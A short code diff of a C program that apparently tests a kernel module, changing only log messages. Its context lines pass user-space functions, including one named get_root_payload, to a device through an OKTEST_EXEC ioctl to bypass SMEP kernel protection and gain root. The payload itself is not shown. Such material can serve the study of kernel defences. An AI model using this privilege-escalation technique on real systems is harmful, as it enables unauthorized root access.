@@ -106,11 +106,11 @@ int main(int argc, char **argv)
 		return -1;
 	}
 	printf("Count is %d\n", count);
-	printf("Calling OKTEST_EXEC to bypass SMEP/SMAP with func1\n");
+	printf("Calling OKTEST_EXEC to bypass SMEP with func1\n");
 	ioctl(fd, OKTEST_EXEC, func1);
 	printf("Count is %d\n", count);
 	
-	printf("Calling OKTEST_EXEC to bypass SMEP/SMAP with get_root_payload\n");
+	printf("Calling OKTEST_EXEC to bypass SMEP with get_root_payload\n");
 	ioctl(fd, OKTEST_EXEC, get_root_payload);
 
 	printf("OKTEST_EXEC done\n");
